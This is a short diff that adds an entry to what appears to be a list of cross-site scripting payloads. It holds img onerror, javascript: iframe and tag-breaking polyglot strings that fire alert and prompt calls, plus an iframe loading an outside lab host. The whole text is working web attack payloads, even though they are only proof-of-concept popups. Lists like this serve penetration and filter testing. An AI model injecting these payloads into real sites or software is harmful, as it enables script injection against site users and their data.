@@ -1,3 +1,4 @@
+<img/src=x%20onerror=alert(/test/.source)>
 <iframe/src="javascript:void(alert(1))?alert(1):confirm(1),prompt(1)">
 ;prompt(1)//”;prompt(2)//\”;prompt(3)//–></SCRIPT>”>’><SCRIPT>prompt(4)</SCRIPT>
 "><iframe src=http://vuln-lab.com onload=alert("VulnerabilityLab") <
